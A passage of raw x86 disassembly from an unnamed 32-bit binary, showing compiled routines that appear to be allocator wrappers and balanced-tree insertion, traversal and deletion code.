   13911:	push   edi
   13912:	call   0x10a86
   13917:	pop    ecx
   13918:	mov    edi,esi
   1391a:	cmp    esi,DWORD PTR ds:0x7f8b8
   13920:	jne    0x13905
   13922:	pop    edi
   13923:	pop    esi
   13924:	pop    ebx
   13925:	pop    ebp
   13926:	ret    0x4
   13929:	int3   
   1392a:	int3   
   1392b:	int3   
   1392c:	int3   
   1392d:	int3   
   1392e:	mov    edi,edi
   13930:	push   ebp
   13931:	mov    ebp,esp
   13933:	push   ebx
   13934:	push   esi
   13935:	push   edi
   13936:	mov    edi,DWORD PTR [ebp+0x8]
   13939:	mov    ebx,ecx
   1393b:	mov    esi,edi
   1393d:	cmp    edi,DWORD PTR ds:0x7f8bc
   13943:	je     0x13962
   13945:	push   DWORD PTR [esi+0x8]
   13948:	mov    ecx,ebx
   1394a:	call   0x1392e
   1394f:	mov    esi,DWORD PTR [esi]
   13951:	push   edi
   13952:	call   0x10a86
   13957:	pop    ecx
   13958:	mov    edi,esi
   1395a:	cmp    esi,DWORD PTR ds:0x7f8bc
   13960:	jne    0x13945
   13962:	pop    edi
   13963:	pop    esi
   13964:	pop    ebx
   13965:	pop    ebp
   13966:	ret    0x4
   13969:	int3   
   1396a:	int3   
   1396b:	int3   
   1396c:	int3   
   1396d:	int3   
   1396e:	mov    edi,edi
   13970:	push   ebp
   13971:	mov    ebp,esp
   13973:	push   0x0
   13975:	push   0x18
   13977:	call   0x11622
   1397c:	mov    ecx,DWORD PTR [ebp+0x8]
   1397f:	mov    DWORD PTR [eax+0x4],ecx
   13982:	mov    ecx,DWORD PTR [ebp+0xc]
   13985:	mov    DWORD PTR [eax+0x14],ecx
   13988:	pop    ebp
   13989:	ret    0x8
   1398c:	int3   
   1398d:	int3   
   1398e:	int3   
   1398f:	int3   
   13990:	int3   
   13991:	int3   
   13992:	mov    edi,edi
   13994:	push   ebp
   13995:	mov    ebp,esp
   13997:	push   0x0
   13999:	push   0x70
   1399b:	call   0x11622
   139a0:	mov    ecx,DWORD PTR [ebp+0x8]
   139a3:	mov    DWORD PTR [eax+0x4],ecx
   139a6:	mov    ecx,DWORD PTR [ebp+0xc]
   139a9:	mov    DWORD PTR [eax+0x68],ecx
   139ac:	pop    ebp
   139ad:	ret    0x8
   139b0:	int3   
   139b1:	int3   
   139b2:	int3   
   139b3:	int3   
   139b4:	int3   
   139b5:	int3   
   139b6:	mov    edi,edi
   139b8:	push   ebp
   139b9:	mov    ebp,esp
   139bb:	push   0x0
   139bd:	push   0x14
   139bf:	call   0x11622
   139c4:	mov    ecx,DWORD PTR [ebp+0x8]
   139c7:	mov    DWORD PTR [eax+0x4],ecx
   139ca:	mov    ecx,DWORD PTR [ebp+0xc]
   139cd:	mov    DWORD PTR [eax+0x10],ecx
   139d0:	pop    ebp
   139d1:	ret    0x8
   139d4:	int3   
   139d5:	int3   
   139d6:	int3   
   139d7:	int3   
   139d8:	int3   
   139d9:	int3   
   139da:	mov    edi,edi
   139dc:	push   ebp
   139dd:	mov    ebp,esp
   139df:	push   0x0
   139e1:	push   0x78
   139e3:	call   0x11622
   139e8:	mov    ecx,DWORD PTR [ebp+0x8]
   139eb:	mov    DWORD PTR [eax+0x4],ecx
   139ee:	mov    ecx,DWORD PTR [ebp+0xc]
   139f1:	mov    DWORD PTR [eax+0x70],ecx
   139f4:	pop    ebp
   139f5:	ret    0x8
   139f8:	int3   
   139f9:	int3   
   139fa:	int3   
   139fb:	int3   
   139fc:	int3   
   139fd:	int3   
   139fe:	mov    edi,edi
   13a00:	push   ebp
   13a01:	mov    ebp,esp
   13a03:	push   0x0
   13a05:	push   0x20
   13a07:	call   0x11622
   13a0c:	mov    ecx,DWORD PTR [ebp+0x8]
   13a0f:	mov    DWORD PTR [eax+0x4],ecx
   13a12:	mov    ecx,DWORD PTR [ebp+0xc]
   13a15:	mov    DWORD PTR [eax+0x1c],ecx
   13a18:	pop    ebp
   13a19:	ret    0x8
   13a1c:	int3   
   13a1d:	int3   
   13a1e:	int3   
   13a1f:	int3   
   13a20:	int3   
   13a21:	int3   
   13a22:	mov    edi,edi
   13a24:	push   ebp
   13a25:	mov    ebp,esp
   13a27:	push   esi
   13a28:	push   edi
   13a29:	mov    edi,DWORD PTR [ebp+0x8]
   13a2c:	push   edi
   13a2d:	mov    esi,ecx
   13a2f:	call   0x129da
   13a34:	add    edi,0x8
   13a37:	push   edi
   13a38:	lea    ecx,[esi+0x8]
   13a3b:	call   0x13524
   13a40:	pop    edi
   13a41:	mov    eax,esi
   13a43:	pop    esi
   13a44:	pop    ebp
   13a45:	ret    0x4
   13a48:	int3   
   13a49:	int3   
   13a4a:	int3   
   13a4b:	int3   
   13a4c:	int3   
   13a4d:	int3   
   13a4e:	mov    edi,edi
   13a50:	push   ebp
   13a51:	mov    ebp,esp
   13a53:	push   ecx
   13a54:	push   DWORD PTR [ebp-0x4]
   13a57:	push   DWORD PTR [ebp+0x10]
   13a5a:	push   DWORD PTR [ebp+0xc]
   13a5d:	push   DWORD PTR [ebp+0x8]
   13a60:	call   0x13642
   13a65:	add    esp,0x10
   13a68:	leave  
   13a69:	ret    
   13a6a:	int3   
   13a6b:	int3   
   13a6c:	int3   
   13a6d:	int3   
   13a6e:	int3   
   13a6f:	int3   
   13a70:	mov    edi,edi
   13a72:	push   ebp
   13a73:	mov    ebp,esp
   13a75:	push   ecx
   13a76:	push   DWORD PTR [ebp-0x4]
   13a79:	push   DWORD PTR [ebp+0x10]
   13a7c:	push   DWORD PTR [ebp+0xc]
   13a7f:	push   DWORD PTR [ebp+0x8]
   13a82:	call   0x1366c
   13a87:	add    esp,0x10
   13a8a:	leave  
   13a8b:	ret    
   13a8c:	int3   
   13a8d:	int3   
   13a8e:	int3   
   13a8f:	int3   
   13a90:	int3   
   13a91:	int3   
   13a92:	mov    edi,edi
   13a94:	push   ebp
   13a95:	mov    ebp,esp
   13a97:	push   ecx
   13a98:	push   DWORD PTR [ebp-0x4]
   13a9b:	push   DWORD PTR [ebp+0x10]
   13a9e:	push   DWORD PTR [ebp+0xc]
   13aa1:	push   DWORD PTR [ebp+0x8]
   13aa4:	call   0x13696
   13aa9:	add    esp,0x10
   13aac:	leave  
   13aad:	ret    
   13aae:	int3   
   13aaf:	int3   
   13ab0:	int3   
   13ab1:	int3   
   13ab2:	int3   
   13ab3:	int3   
   13ab4:	mov    edi,edi
   13ab6:	push   ebp
   13ab7:	mov    ebp,esp
   13ab9:	push   ecx
   13aba:	push   DWORD PTR [ebp-0x4]
   13abd:	push   DWORD PTR [ebp+0x10]
   13ac0:	push   DWORD PTR [ebp+0xc]
   13ac3:	push   DWORD PTR [ebp+0x8]
   13ac6:	call   0x136c0
   13acb:	add    esp,0x10
   13ace:	leave  
   13acf:	ret    
   13ad0:	int3   
   13ad1:	int3   
   13ad2:	int3   
   13ad3:	int3   
   13ad4:	int3   
   13ad5:	int3   
   13ad6:	mov    edi,edi
   13ad8:	push   ebp
   13ad9:	mov    ebp,esp
   13adb:	mov    ecx,DWORD PTR [ebp+0x8]
   13ade:	test   ecx,ecx
   13ae0:	je     0x13aea
   13ae2:	push   DWORD PTR [ebp+0xc]
   13ae5:	call   0x13a22
   13aea:	pop    ebp
   13aeb:	ret    0x8
   13aee:	int3   
   13aef:	int3   
   13af0:	int3   
   13af1:	int3   
   13af2:	int3   
   13af3:	int3   
   13af4:	mov    edi,edi
   13af6:	push   ebp
   13af7:	mov    ebp,esp
   13af9:	mov    ecx,DWORD PTR [ebp+0x8]
   13afc:	push   0x0
   13afe:	call   0x1354a
   13b03:	pop    ebp
   13b04:	ret    0x4
   13b07:	int3   
   13b08:	int3   
   13b09:	int3   
   13b0a:	int3   
   13b0b:	int3   
   13b0c:	mov    edi,edi
   13b0e:	push   ebp
   13b0f:	mov    ebp,esp
   13b11:	mov    ecx,DWORD PTR [ebp+0x8]
   13b14:	test   ecx,ecx
   13b16:	je     0x13b20
   13b18:	push   DWORD PTR [ebp+0xc]
   13b1b:	call   0x13570
   13b20:	pop    ebp
   13b21:	ret    0x8
   13b24:	int3   
   13b25:	int3   
   13b26:	int3   
   13b27:	int3   
   13b28:	int3   
   13b29:	int3   
   13b2a:	mov    edi,edi
   13b2c:	push   ebp
   13b2d:	mov    ebp,esp
   13b2f:	mov    ecx,DWORD PTR [ebp+0x8]
   13b32:	test   ecx,ecx
   13b34:	je     0x13b3e
   13b36:	push   DWORD PTR [ebp+0xc]
   13b39:	call   0x134e0
   13b3e:	pop    ebp
   13b3f:	ret    0x8
   13b42:	int3   
   13b43:	int3   
   13b44:	int3   
   13b45:	int3   
   13b46:	int3   
   13b47:	int3   
   13b48:	mov    edi,edi
   13b4a:	push   ebp
   13b4b:	mov    ebp,esp
   13b4d:	mov    ecx,DWORD PTR [ebp+0x8]
   13b50:	test   ecx,ecx
   13b52:	je     0x13b5c
   13b54:	push   DWORD PTR [ebp+0xc]
   13b57:	call   0x1359c
   13b5c:	pop    ebp
   13b5d:	ret    0x8
   13b60:	int3   
   13b61:	int3   
   13b62:	int3   
   13b63:	int3   
   13b64:	int3   
   13b65:	int3   
   13b66:	mov    edi,edi
   13b68:	push   ebp
   13b69:	mov    ebp,esp
   13b6b:	mov    ecx,DWORD PTR [ebp+0x8]
   13b6e:	push   0x0
   13b70:	call   0x135c4
   13b75:	pop    ebp
   13b76:	ret    0x4
   13b79:	int3   
   13b7a:	int3   
   13b7b:	int3   
   13b7c:	int3   
   13b7d:	int3   
   13b7e:	mov    edi,edi
   13b80:	push   ebp
   13b81:	mov    ebp,esp
   13b83:	mov    ecx,DWORD PTR [ebp+0x8]
   13b86:	test   ecx,ecx
   13b88:	je     0x13b92
   13b8a:	push   DWORD PTR [ebp+0xc]
   13b8d:	call   0x134b4
   13b92:	pop    ebp
   13b93:	ret    0x8
   13b96:	int3   
   13b97:	int3   
   13b98:	int3   
   13b99:	int3   
   13b9a:	int3   
   13b9b:	int3   
   13b9c:	mov    edi,edi
   13b9e:	push   ebp
   13b9f:	mov    ebp,esp
   13ba1:	push   ecx
   13ba2:	mov    eax,ds:0x7f8bc
   13ba7:	push   ebx
   13ba8:	mov    ebx,DWORD PTR [ebp+0xc]
   13bab:	push   esi
   13bac:	mov    esi,DWORD PTR [ebp+0x8]
   13baf:	mov    DWORD PTR [ebp-0x4],ecx
   13bb2:	mov    DWORD PTR [ebp+0x8],esi
   13bb5:	cmp    esi,eax
   13bb7:	je     0x13bfc
   13bb9:	push   edi
   13bba:	push   DWORD PTR [esi+0x10]
   13bbd:	mov    ecx,DWORD PTR [ebp-0x4]
   13bc0:	push   ebx
   13bc1:	call   0x139b6
   13bc6:	mov    edi,eax
   13bc8:	cmp    DWORD PTR [ebp+0x8],esi
   13bcb:	jne    0x13bd0
   13bcd:	mov    DWORD PTR [ebp+0x8],edi
   13bd0:	mov    ecx,DWORD PTR [ebp-0x4]
   13bd3:	push   edi
   13bd4:	push   DWORD PTR [esi+0x8]
   13bd7:	call   0x13b9c
   13bdc:	mov    DWORD PTR [edi+0x8],eax
   13bdf:	lea    eax,[esi+0xc]
   13be2:	push   eax
   13be3:	lea    eax,[edi+0xc]
   13be6:	push   eax
   13be7:	call   0x1a3a2
   13bec:	mov    DWORD PTR [ebx],edi
   13bee:	mov    esi,DWORD PTR [esi]
   13bf0:	mov    eax,ds:0x7f8bc
   13bf5:	mov    ebx,edi
   13bf7:	cmp    esi,eax
   13bf9:	jne    0x13bba
   13bfb:	pop    edi
   13bfc:	mov    DWORD PTR [ebx],eax
   13bfe:	mov    eax,DWORD PTR [ebp+0x8]
   13c01:	pop    esi
   13c02:	pop    ebx
   13c03:	leave  
   13c04:	ret    0x8
   13c07:	int3   
   13c08:	int3   
   13c09:	int3   
   13c0a:	int3   
   13c0b:	int3   
   13c0c:	mov    edi,edi
   13c0e:	push   ebp
   13c0f:	mov    ebp,esp
   13c11:	push   ecx
   13c12:	push   esi
   13c13:	push   edi
   13c14:	mov    edi,DWORD PTR [ebp+0xc]
   13c17:	push   edi
   13c18:	mov    esi,ecx
   13c1a:	call   0x12d44
   13c1f:	mov    esi,DWORD PTR [esi+0x4]
   13c22:	mov    DWORD PTR [ebp+0xc],eax
   13c25:	cmp    eax,esi
   13c27:	je     0x13c35
   13c29:	mov    ecx,DWORD PTR [edi]
   13c2b:	cmp    ecx,DWORD PTR [eax+0xc]
   13c2e:	jb     0x13c35
   13c30:	lea    eax,[ebp+0xc]
   13c33:	jmp    0x13c3b
   13c35:	mov    DWORD PTR [ebp-0x4],esi
   13c38:	lea    eax,[ebp-0x4]
   13c3b:	mov    ecx,DWORD PTR [eax]
   13c3d:	mov    eax,DWORD PTR [ebp+0x8]
   13c40:	pop    edi
   13c41:	mov    DWORD PTR [eax],ecx
   13c43:	pop    esi
   13c44:	leave  
   13c45:	ret    0x8
   13c48:	int3   
   13c49:	int3   
   13c4a:	int3   
   13c4b:	int3   
   13c4c:	int3   
   13c4d:	int3   
   13c4e:	mov    edi,edi
   13c50:	push   ebp
   13c51:	mov    ebp,esp
   13c53:	push   ecx
   13c54:	push   esi
   13c55:	push   DWORD PTR [ebp+0xc]
   13c58:	mov    esi,ecx
   13c5a:	call   0x12e1a
   13c5f:	mov    DWORD PTR [ebp-0x4],eax
   13c62:	cmp    eax,DWORD PTR [esi+0x4]
   13c65:	je     0x13c7c
   13c67:	add    eax,0x10
   13c6a:	push   eax
   13c6b:	push   DWORD PTR [ebp+0xc]
   13c6e:	call   0x197f4
   13c73:	test   al,al
   13c75:	jne    0x13c7c
   13c77:	lea    eax,[ebp-0x4]
   13c7a:	jmp    0x13c85
   13c7c:	mov    eax,DWORD PTR [esi+0x4]
   13c7f:	mov    DWORD PTR [ebp+0xc],eax
   13c82:	lea    eax,[ebp+0xc]
   13c85:	mov    ecx,DWORD PTR [eax]
   13c87:	mov    eax,DWORD PTR [ebp+0x8]
   13c8a:	mov    DWORD PTR [eax],ecx
   13c8c:	pop    esi
   13c8d:	leave  
   13c8e:	ret    0x8
   13c91:	int3   
   13c92:	int3   
   13c93:	int3   
   13c94:	int3   
   13c95:	int3   
   13c96:	mov    edi,edi
   13c98:	push   ebp
   13c99:	mov    ebp,esp
   13c9b:	push   ecx
   13c9c:	push   esi
   13c9d:	push   DWORD PTR [ebp+0xc]
   13ca0:	mov    esi,ecx
   13ca2:	call   0x12e5a
   13ca7:	mov    DWORD PTR [ebp-0x4],eax
   13caa:	cmp    eax,DWORD PTR [esi+0x4]
   13cad:	je     0x13cc4
   13caf:	add    eax,0xc
   13cb2:	push   eax
   13cb3:	push   DWORD PTR [ebp+0xc]
   13cb6:	call   0x197f4
   13cbb:	test   al,al
   13cbd:	jne    0x13cc4
   13cbf:	lea    eax,[ebp-0x4]
   13cc2:	jmp    0x13ccd
   13cc4:	mov    eax,DWORD PTR [esi+0x4]
   13cc7:	mov    DWORD PTR [ebp+0xc],eax
   13cca:	lea    eax,[ebp+0xc]
   13ccd:	mov    ecx,DWORD PTR [eax]
   13ccf:	mov    eax,DWORD PTR [ebp+0x8]
   13cd2:	mov    DWORD PTR [eax],ecx
   13cd4:	pop    esi
   13cd5:	leave  
   13cd6:	ret    0x8
   13cd9:	int3   
   13cda:	int3   
   13cdb:	int3   
   13cdc:	int3   
   13cdd:	int3   
   13cde:	mov    edi,edi
   13ce0:	push   ebp
   13ce1:	mov    ebp,esp
   13ce3:	push   ecx
   13ce4:	push   esi
   13ce5:	push   edi
   13ce6:	mov    edi,DWORD PTR [ebp+0xc]
   13ce9:	push   edi
   13cea:	mov    esi,ecx
   13cec:	call   0x12e9a
   13cf1:	mov    esi,DWORD PTR [esi+0x4]
   13cf4:	mov    DWORD PTR [ebp+0xc],eax
   13cf7:	cmp    eax,esi
   13cf9:	je     0x13d07
   13cfb:	mov    ecx,DWORD PTR [edi]
   13cfd:	cmp    ecx,DWORD PTR [eax+0xc]
   13d00:	jl     0x13d07
   13d02:	lea    eax,[ebp+0xc]
   13d05:	jmp    0x13d0d
   13d07:	mov    DWORD PTR [ebp-0x4],esi
   13d0a:	lea    eax,[ebp-0x4]
   13d0d:	mov    ecx,DWORD PTR [eax]
   13d0f:	mov    eax,DWORD PTR [ebp+0x8]
   13d12:	pop    edi
   13d13:	mov    DWORD PTR [eax],ecx
   13d15:	pop    esi
   13d16:	leave  
   13d17:	ret    0x8
   13d1a:	int3   
   13d1b:	int3   
   13d1c:	int3   
   13d1d:	int3   
   13d1e:	int3   
   13d1f:	int3   
   13d20:	mov    edi,edi
   13d22:	push   ebp
   13d23:	mov    ebp,esp
   13d25:	push   ecx
   13d26:	mov    eax,DWORD PTR [ecx]
   13d28:	lea    ecx,[ebp-0x4]
   13d2b:	mov    DWORD PTR [ebp-0x4],eax
   13d2e:	call   0x12f08
   13d33:	mov    eax,DWORD PTR [ebp-0x4]
   13d36:	add    eax,0xc
   13d39:	leave  
   13d3a:	ret    
   13d3b:	int3   
   13d3c:	int3   
   13d3d:	int3   
   13d3e:	int3   
   13d3f:	int3   
   13d40:	mov    edi,edi
   13d42:	push   ebp
   13d43:	mov    ebp,esp
   13d45:	push   ecx
   13d46:	push   esi
   13d47:	push   DWORD PTR [ebp+0xc]
   13d4a:	mov    esi,ecx
   13d4c:	call   0x1301c
   13d51:	mov    DWORD PTR [ebp-0x4],eax
   13d54:	cmp    eax,DWORD PTR [esi+0x4]
   13d57:	je     0x13d6e
   13d59:	add    eax,0x10
   13d5c:	push   eax
   13d5d:	push   DWORD PTR [ebp+0xc]
   13d60:	call   0x197f4
   13d65:	test   al,al
   13d67:	jne    0x13d6e
   13d69:	lea    eax,[ebp-0x4]
   13d6c:	jmp    0x13d77
   13d6e:	mov    eax,DWORD PTR [esi+0x4]
   13d71:	mov    DWORD PTR [ebp+0xc],eax
   13d74:	lea    eax,[ebp+0xc]
   13d77:	mov    ecx,DWORD PTR [eax]
   13d79:	mov    eax,DWORD PTR [ebp+0x8]
   13d7c:	mov    DWORD PTR [eax],ecx
   13d7e:	pop    esi
   13d7f:	leave  
   13d80:	ret    0x8
   13d83:	int3   
   13d84:	int3   
   13d85:	int3   
   13d86:	int3   
   13d87:	int3   
   13d88:	mov    edi,edi
   13d8a:	push   ebp
   13d8b:	mov    ebp,esp
   13d8d:	push   ecx
   13d8e:	push   ecx
   13d8f:	push   ebx
   13d90:	push   esi
   13d91:	mov    DWORD PTR [ebp-0x4],ecx
   13d94:	push   edi
   13d95:	mov    edi,DWORD PTR [ebp+0xc]
   13d98:	lea    ecx,[ebp+0xc]
   13d9b:	call   0x112d4
   13da0:	mov    esi,DWORD PTR [edi]
   13da2:	mov    eax,ds:0x7f8b8
   13da7:	mov    ebx,edi
   13da9:	mov    DWORD PTR [ebp-0x8],esi
   13dac:	cmp    esi,eax
   13dae:	jne    0x13dcc
   13db0:	mov    esi,DWORD PTR [edi+0x8]
   13db3:	mov    eax,DWORD PTR [ebx+0x4]
   13db6:	mov    ecx,DWORD PTR [ebp-0x4]
   13db9:	mov    DWORD PTR [esi+0x4],eax
   13dbc:	mov    eax,DWORD PTR [ecx+0x4]
   13dbf:	cmp    DWORD PTR [eax+0x4],edi
   13dc2:	jne    0x13e41
   13dc4:	mov    DWORD PTR [eax+0x4],esi
   13dc7:	jmp    0x13e4f
   13dcc:	mov    ecx,DWORD PTR [edi+0x8]
   13dcf:	cmp    ecx,eax
   13dd1:	je     0x13db3
   13dd3:	push   ecx
   13dd4:	call   0x111ea
   13dd9:	mov    ebx,eax
   13ddb:	mov    esi,DWORD PTR [ebx+0x8]
   13dde:	cmp    ebx,edi
   13de0:	je     0x13db3
   13de2:	mov    eax,DWORD PTR [ebp-0x8]
   13de5:	mov    DWORD PTR [eax+0x4],ebx
   13de8:	mov    eax,DWORD PTR [edi]
   13dea:	mov    DWORD PTR [ebx],eax
   13dec:	cmp    ebx,DWORD PTR [edi+0x8]
   13def:	jne    0x13df6
   13df1:	mov    DWORD PTR [esi+0x4],ebx
   13df4:	jmp    0x13e0d
   13df6:	mov    eax,DWORD PTR [ebx+0x4]
   13df9:	mov    DWORD PTR [esi+0x4],eax
   13dfc:	mov    eax,DWORD PTR [ebx+0x4]
   13dff:	mov    DWORD PTR [eax],esi
   13e01:	mov    eax,DWORD PTR [edi+0x8]
   13e04:	mov    DWORD PTR [ebx+0x8],eax
   13e07:	mov    eax,DWORD PTR [edi+0x8]
   13e0a:	mov    DWORD PTR [eax+0x4],ebx
   13e0d:	mov    eax,DWORD PTR [ebp-0x4]
   13e10:	mov    eax,DWORD PTR [eax+0x4]
   13e13:	cmp    DWORD PTR [eax+0x4],edi
   13e16:	jne    0x13e1d
   13e18:	mov    DWORD PTR [eax+0x4],ebx
   13e1b:	jmp    0x13e2b
   13e1d:	mov    eax,DWORD PTR [edi+0x4]
   13e20:	cmp    DWORD PTR [eax],edi
   13e22:	jne    0x13e28
   13e24:	mov    DWORD PTR [eax],ebx
   13e26:	jmp    0x13e2b
   13e28:	mov    DWORD PTR [eax+0x8],ebx
   13e2b:	mov    eax,DWORD PTR [edi+0x4]
   13e2e:	mov    DWORD PTR [ebx+0x4],eax
   13e31:	mov    eax,DWORD PTR [ebx+0x14]
   13e34:	mov    ecx,DWORD PTR [edi+0x14]
   13e37:	mov    DWORD PTR [ebx+0x14],ecx
   13e3a:	mov    DWORD PTR [edi+0x14],eax
   13e3d:	mov    ebx,edi
   13e3f:	jmp    0x13ea2
   13e41:	mov    eax,DWORD PTR [edi+0x4]
   13e44:	cmp    DWORD PTR [eax],edi
   13e46:	jne    0x13e4c
   13e48:	mov    DWORD PTR [eax],esi
   13e4a:	jmp    0x13e4f
   13e4c:	mov    DWORD PTR [eax+0x8],esi
   13e4f:	mov    eax,DWORD PTR [ecx+0x4]
   13e52:	mov    DWORD PTR [ebp-0x8],eax
   13e55:	cmp    DWORD PTR [eax],edi
   13e57:	jne    0x13e79
   13e59:	mov    edx,DWORD PTR [edi+0x8]
   13e5c:	cmp    edx,DWORD PTR ds:0x7f8b8
   13e62:	jne    0x13e6b
   13e64:	mov    edx,DWORD PTR [edi+0x4]
   13e67:	mov    DWORD PTR [eax],edx
   13e69:	jmp    0x13e79
   13e6b:	push   esi
   13e6c:	call   0x111ea
   13e71:	mov    ecx,DWORD PTR [ebp-0x8]
   13e74:	mov    DWORD PTR [ecx],eax
   13e76:	mov    ecx,DWORD PTR [ebp-0x4]
   13e79:	mov    eax,DWORD PTR [ecx+0x4]
   13e7c:	mov    DWORD PTR [ebp-0x8],eax
   13e7f:	cmp    DWORD PTR [eax+0x8],edi
   13e82:	jne    0x13ea2
   13e84:	mov    ecx,DWORD PTR [edi]
   13e86:	cmp    ecx,DWORD PTR ds:0x7f8b8
   13e8c:	jne    0x13e96
   13e8e:	mov    ecx,DWORD PTR [edi+0x4]
   13e91:	mov    DWORD PTR [eax+0x8],ecx
   13e94:	jmp    0x13ea2
   13e96:	push   esi
   13e97:	call   0x111c8
   13e9c:	mov    ecx,DWORD PTR [ebp-0x8]
   13e9f:	mov    DWORD PTR [ecx+0x8],eax
   13ea2:	xor    edi,edi
   13ea4:	inc    edi
   13ea5:	cmp    DWORD PTR [ebx+0x14],edi
   13ea8:	jne    0x13fbf
   13eae:	jmp    0x13f6d
   13eb3:	cmp    DWORD PTR [esi+0x14],edi
   13eb6:	jne    0x13fbc
   13ebc:	mov    eax,DWORD PTR [esi+0x4]
   13ebf:	cmp    esi,DWORD PTR [eax]
   13ec1:	jne    0x13f38
   13ec3:	mov    eax,DWORD PTR [eax+0x8]
   13ec6:	cmp    DWORD PTR [eax+0x14],0x0
   13eca:	jne    0x13ee4
   13ecc:	mov    DWORD PTR [eax+0x14],edi
   13ecf:	mov    eax,DWORD PTR [esi+0x4]
   13ed2:	and    DWORD PTR [eax+0x14],0x0
   13ed6:	push   DWORD PTR [esi+0x4]
   13ed9:	call   0x12d7c
   13ede:	mov    eax,DWORD PTR [esi+0x4]
   13ee1:	mov    eax,DWORD PTR [eax+0x8]
   13ee4:	mov    ecx,DWORD PTR [eax]
   13ee6:	cmp    DWORD PTR [ecx+0x14],edi
   13ee9:	jne    0x13ef3
   13eeb:	mov    ecx,DWORD PTR [eax+0x8]
   13eee:	cmp    DWORD PTR [ecx+0x14],edi
   13ef1:	je     0x13f66
   13ef3:	mov    ecx,DWORD PTR [eax+0x8]
   13ef6:	cmp    DWORD PTR [ecx+0x14],edi
   13ef9:	jne    0x13f13
   13efb:	mov    ecx,DWORD PTR [eax]
   13efd:	mov    DWORD PTR [ecx+0x14],edi
   13f00:	mov    ecx,DWORD PTR [ebp-0x4]
   13f03:	and    DWORD PTR [eax+0x14],0x0
   13f07:	push   eax
   13f08:	call   0x12dca
   13f0d:	mov    eax,DWORD PTR [esi+0x4]
   13f10:	mov    eax,DWORD PTR [eax+0x8]
   13f13:	mov    ecx,DWORD PTR [esi+0x4]
   13f16:	mov    ecx,DWORD PTR [ecx+0x14]
   13f19:	mov    DWORD PTR [eax+0x14],ecx
   13f1c:	mov    ecx,DWORD PTR [esi+0x4]
   13f1f:	mov    DWORD PTR [ecx+0x14],edi
   13f22:	mov    eax,DWORD PTR [eax+0x8]
   13f25:	mov    ecx,DWORD PTR [ebp-0x4]
   13f28:	mov    DWORD PTR [eax+0x14],edi
   13f2b:	push   DWORD PTR [esi+0x4]
   13f2e:	call   0x12d7c
   13f33:	jmp    0x13fbc
   13f38:	mov    eax,DWORD PTR [eax]
   13f3a:	cmp    DWORD PTR [eax+0x14],0x0
   13f3e:	jne    0x13f57
   13f40:	mov    DWORD PTR [eax+0x14],edi
   13f43:	mov    eax,DWORD PTR [esi+0x4]
   13f46:	and    DWORD PTR [eax+0x14],0x0
   13f4a:	push   DWORD PTR [esi+0x4]
   13f4d:	call   0x12dca
   13f52:	mov    eax,DWORD PTR [esi+0x4]
   13f55:	mov    eax,DWORD PTR [eax]
   13f57:	mov    ecx,DWORD PTR [eax+0x8]
   13f5a:	cmp    DWORD PTR [ecx+0x14],edi
   13f5d:	jne    0x13f7e
   13f5f:	mov    ecx,DWORD PTR [eax]
   13f61:	cmp    DWORD PTR [ecx+0x14],edi
   13f64:	jne    0x13f7e
   13f66:	and    DWORD PTR [eax+0x14],0x0
   13f6a:	mov    esi,DWORD PTR [esi+0x4]
   13f6d:	mov    ecx,DWORD PTR [ebp-0x4]
   13f70:	mov    eax,DWORD PTR [ecx+0x4]
   13f73:	cmp    esi,DWORD PTR [eax+0x4]
   13f76:	jne    0x13eb3
   13f7c:	jmp    0x13fbc
   13f7e:	mov    ecx,DWORD PTR [eax]
   13f80:	cmp    DWORD PTR [ecx+0x14],edi
   13f83:	jne    0x13f9d
   13f85:	mov    ecx,DWORD PTR [eax+0x8]
   13f88:	mov    DWORD PTR [ecx+0x14],edi
   13f8b:	mov    ecx,DWORD PTR [ebp-0x4]
   13f8e:	and    DWORD PTR [eax+0x14],0x0
   13f92:	push   eax
   13f93:	call   0x12d7c
   13f98:	mov    eax,DWORD PTR [esi+0x4]
   13f9b:	mov    eax,DWORD PTR [eax]
   13f9d:	mov    ecx,DWORD PTR [esi+0x4]
   13fa0:	mov    ecx,DWORD PTR [ecx+0x14]
   13fa3:	mov    DWORD PTR [eax+0x14],ecx
   13fa6:	mov    ecx,DWORD PTR [esi+0x4]
   13fa9:	mov    DWORD PTR [ecx+0x14],edi
   13fac:	mov    eax,DWORD PTR [eax]
   13fae:	mov    ecx,DWORD PTR [ebp-0x4]
   13fb1:	mov    DWORD PTR [eax+0x14],edi
   13fb4:	push   DWORD PTR [esi+0x4]
   13fb7:	call   0x12dca
   13fbc:	mov    DWORD PTR [esi+0x14],edi
   13fbf:	push   ebx
   13fc0:	call   0x10a86
   13fc5:	mov    eax,DWORD PTR [ebp-0x4]
   13fc8:	dec    DWORD PTR [eax+0xc]
   13fcb:	mov    eax,DWORD PTR [ebp+0x8]
   13fce:	pop    ecx
   13fcf:	mov    ecx,DWORD PTR [ebp+0xc]
   13fd2:	pop    edi
   13fd3:	pop    esi
   13fd4:	mov    DWORD PTR [eax],ecx
   13fd6:	pop    ebx
   13fd7:	leave  
   13fd8:	ret    0x8
   13fdb:	int3   
   13fdc:	int3   
   13fdd:	int3   
   13fde:	int3   
   13fdf:	int3   
   13fe0:	mov    edi,edi
   13fe2:	push   ebp
   13fe3:	mov    ebp,esp
   13fe5:	push   esi
   13fe6:	push   edi
   13fe7:	push   DWORD PTR [ebp+0xc]
   13fea:	mov    edi,ecx
   13fec:	call   0x130fa
   13ff1:	push   DWORD PTR [ebp+0xc]
   13ff4:	mov    ecx,edi
   13ff6:	mov    esi,eax
   13ff8:	call   0x12d44
   13ffd:	mov    ecx,DWORD PTR [ebp+0x8]
   14000:	pop    edi
   14001:	mov    DWORD PTR [ecx],eax
   14003:	mov    DWORD PTR [ecx+0x4],esi
   14006:	mov    eax,ecx
   14008:	pop    esi
   14009:	pop    ebp
   1400a:	ret    0x8
   1400d:	int3   
   1400e:	int3   
   1400f:	int3   
   14010:	int3   
   14011:	int3   
   14012:	mov    edi,edi
   14014:	push   esi
   14015:	push   edi
   14016:	push   0x1
   14018:	xor    edi,edi
   1401a:	push   edi
   1401b:	mov    esi,ecx
   1401d:	call   0x1396e
   14022:	cmp    DWORD PTR ds:0x7f8b8,edi
   14028:	jne    0x1403f
   1402a:	mov    ecx,eax
   1402c:	mov    DWORD PTR ds:0x7f8b8,ecx
   14032:	mov    DWORD PTR [ecx],edi
   14034:	mov    ecx,DWORD PTR ds:0x7f8b8
   1403a:	xor    eax,eax
   1403c:	mov    DWORD PTR [ecx+0x8],edi
   1403f:	inc    DWORD PTR ds:0x7fa18
   14045:	cmp    eax,edi
   14047:	je     0x14050
   14049:	push   eax
   1404a:	call   0x10a86
   1404f:	pop    ecx
   14050:	push   edi
